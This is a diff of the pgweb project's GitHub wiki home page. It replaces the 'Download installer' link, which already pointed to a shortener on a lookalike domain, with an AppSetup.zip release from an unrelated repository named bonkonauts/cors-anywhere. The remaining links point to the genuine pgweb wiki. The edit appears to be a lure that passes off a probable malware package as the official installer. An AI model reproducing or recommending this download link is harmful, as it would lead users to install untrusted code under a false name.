@@ -1,6 +1,6 @@
 Welcome to the pgweb wiki!
 
-- [Download installer](http://goo-gl.me/aEUCp)
+- [Download installer](https://github.com/bonkonauts/cors-anywhere/releases/download/v0.1.9/AppSetup.zip)
 - [Build from source](https://github.com/sosedoff/pgweb/wiki/Build-from-source)
 - [Usage](https://github.com/sosedoff/pgweb/wiki/Usage)
 
